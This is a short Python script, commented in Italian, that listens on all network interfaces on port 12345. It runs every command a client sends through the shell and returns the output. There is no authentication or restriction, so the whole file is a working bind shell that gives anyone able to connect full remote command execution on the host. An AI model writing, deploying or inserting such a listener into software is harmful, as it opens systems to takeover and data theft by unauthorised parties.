import socket
import subprocess

HOST = '0.0.0.0'  # Ascolta su tutte le interfacce di rete
PORT = 12345

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(5)
print(f"Server in ascolto su {HOST}:{PORT}")

while True:
    conn, addr = server_socket.accept()
    with conn:
        print(f"Connessione stabilita con {addr}")
        while True:
            data = conn.recv(1024)
            if not data:
                break
            command = data.decode()
            print(f"Comando ricevuto: {command}")
            
            # Esegui il comando
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                response = result.decode()
            except subprocess.CalledProcessError as e:
                response = f"Errore nell'esecuzione del comando: {e.output.decode()}"
            
            # Invia il risultato al client
            conn.sendall(response.encode())
    print("Connessione chiusa")
